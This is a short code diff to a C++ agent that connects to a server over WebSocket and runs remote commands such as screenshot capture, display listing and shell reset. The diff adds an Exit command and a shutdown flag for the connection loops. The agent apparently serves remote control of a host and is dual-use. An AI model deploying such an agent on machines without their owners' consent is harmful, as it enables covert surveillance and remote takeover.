@@ -25,6 +25,8 @@ static const CHAR *CommandTypeName(UINT8 type)
         return "GetScreenshot";
     case CommandType::Command_ResetShell:
         return "ResetShell";
+    case CommandType::Command_Exit:
+        return "Exit";
     default:
         return "Unknown";
     }
@@ -51,10 +53,11 @@ INT32 start()
     commandHandlers[CommandType::Command_GetDisplays] = Handle_GetDisplaysCommand;
     commandHandlers[CommandType::Command_GetScreenshot] = Handle_GetScreenshotCommand;
     commandHandlers[CommandType::Command_ResetShell] = Handle_ResetShellCommand;
+    commandHandlers[CommandType::Command_Exit] = Handle_ExitCommand;
 
     LOG_INFO("Agent starting, registered %d command handlers", (INT32)CommandType::CommandTypeCount);
 
-    while (1)
+    while (!context.shouldExit)
     {
         connectionAttempt++;
         LOG_INFO("Connection attempt #%u to %s", connectionAttempt, (PCCHAR)url);
@@ -69,7 +72,7 @@ INT32 start()
         LOG_INFO("WebSocket connection established (attempt #%u) to %s", connectionAttempt, (PCCHAR)url);
 
         UINT32 messageCount = 0;
-        while (1)
+        while (!context.shouldExit)
         {
             LOG_DEBUG("Waiting for next WebSocket message...");
             auto readResult = wsClient.Read();
